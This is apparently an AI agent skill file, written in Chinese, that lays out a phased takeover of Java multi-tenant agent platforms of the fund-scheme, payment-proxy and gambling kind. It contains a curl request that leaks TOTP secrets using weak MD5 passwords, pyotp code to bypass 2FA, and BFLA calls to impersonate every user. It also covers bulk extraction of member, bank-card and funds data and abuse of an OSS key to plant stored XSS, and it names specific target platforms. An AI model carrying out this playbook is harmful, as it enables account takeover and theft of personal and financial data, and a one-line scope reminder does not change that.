---
name: 铜府·多户
description: >-
  Java Spring Boot 多租户代理平台（资金盘/代付/博彩）：getGoogleAuthAdmin 泄露 TOTP Secret
  绕过 2FA → BFLA login/{userId} 冒充全用户 → OSS policy AK 泄露。
  触发：/account/login/manage、/manage/user/login/{userId}、getGoogleAuthAdmin、
  bindGoogleAuthAdmin、/manage/oss/policy、多租户 Agent-Manager-Staff 架构、
  authCode 字段、tskgreenwind、proxy-bolivia。
version: 1.0.0
author: 大爱仙尊
---

# Java 多租户代理平台接管

目标须在 `授权范围`。

## 真源

- Playbook：`传承/铜府·多户.md`
- 探针：`python3 炼蛊房/java_agent_platform_probe.py --base https://目标API --out 案卷/.../`

## 触发指纹（命中任意 2 个即入）

1. `/account/login/manage` 管理端登录端点
2. `/manage/user/getOptimaList` 或 `/manage/member/getList` 管理 API
3. JS 中出现 `getGoogleAuthAdmin` / `bindGoogleAuthAdmin`
4. 四层用户体系 ADMIN → AGENT → MANAGER → STAFF
5. `authCode` 字段（Google Auth TOTP）
6. `/manage/oss/policy` OSS 上传策略端点
7. Java Spring Boot + 多租户代理/代付/资金盘

## 核心逻辑

### Phase 1: 侦察

```bash
# 1. 下载前端 JS bundle，提取 API 端点
curl -s https://目标/ | grep -oP 'src="[^"]*\.js"'
# 重点搜索: getGoogleAuthAdmin, bindGoogleAuthAdmin, login/manage, user/login

# 2. 枚举 /account/* 和 /manage/* 端点
python3 炼蛊房/java_agent_platform_probe.py --base https://API --phase recon
```

### Phase 2: GA Secret 泄露 + 弱口令

```bash
# getGoogleAuthAdmin 仅需 account+MD5(password)，无需已认证会话
# 密码正确 → 返回 secretKey（即使 GA 已绑定也返回！）
python3 炼蛊房/java_agent_platform_probe.py --base https://API --phase ga-leak

# 手动:
curl -sk https://API/account/getGoogleAuthAdmin \
  -H 'Content-Type: application/json' \
  -d '{"account":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}'
```

常见弱口令（MD5）：`123456` / `admin123` / `888888` / `666666`

### Phase 3: 绑定 GA + 登录

```python
import pyotp, hashlib
secret = "获取到的secretKey"
totp = pyotp.TOTP(secret)

# 绑定: POST /account/bindGoogleAuthAdmin
# {account, password(MD5), code(TOTP), secretKey}

# 登录: POST /account/login/manage
# {account, password(MD5), authCode(TOTP)}
# → 返回 token + role
```

### Phase 4: BFLA 全用户冒充

```bash
# 列用户: GET /manage/user/getOptimaList?pageNum=1&pageSize=200
# 冒充:   POST /manage/user/login/{userId}  (Header: Authorization: ADMIN_TOKEN)
# → 返回目标用户的 token，可操作其所有数据
```

限制：
- Agent 只能 BFLA 到自己的 STAFF/MANAGER
- 跨 Agent 或冒充 ADMIN 需要 ADMIN token
- `modifyGoogleAuth/{userId}` 只能重置 STAFF/MANAGER，不能重置 ADMIN

### Phase 5: 数据提取

切换各 Agent token，拉取：
- 会员数据（`/manage/member/getList`，含 `staffName` 归属）
- 资金流水 / 充值 / 提现 / 产品订单 / 银行卡 / 红包 / 抽奖
- 操作日志 / 系统配置

### Phase 6: OSS 利用

```bash
# GET /manage/oss/policy?type=IMAGE → 泄露 AccessKeyId + 签名策略
# 可直接上传任意文件到 OSS bucket（公开访问）
# Stored XSS: 上传 .html 文件，Content-Type: text/html
```

## 失败处理

| 现象 | 原因 | 处理 |
|------|------|------|
| getGoogleAuthAdmin 返回 "账号不存在" | 用户名错误 | 枚举 JS 中硬编码的账号名 |
| bind 返回 "账号或密码错误" | 部分端点密码校验不一致 | 尝试明文/MD5/双MD5 |
| TOTP 登录 "验证码不一致" | 时钟偏移或 secret 过期 | 重置 GA 后重新获取 secret |
| BFLA 返回 "暂不能对用户进行操作" | 权限不足（Agent 打 ADMIN） | 需要 ADMIN token |
| Actuator 全 404 | CDN 隐藏源站 | 尝试溯源真实 IP |

## 输出

- `auth/admin.token` — ADMIN token
- `auth/admin.ga_secret` — ADMIN GA secret
- `auth/{agent}.token` — 各 Agent token
- `接管/admin_takeover_evidence.json` — 完整证据
- `tskgreenwind_数据提取_*/00_全量合并(含归属)/` — 含租户归属 CSV

## 同族平台特征

此架构常见于中国团伙运营的海外资金盘/代付平台/博彩后台：
- `com.db.trade` 包名
- 玻利维亚/东南亚/非洲目标市场
- Yape/本地银行卡收款
- 固定收益产品 + MLM 佣金层级
- 阿里云基础设施（ESA CDN + OSS）
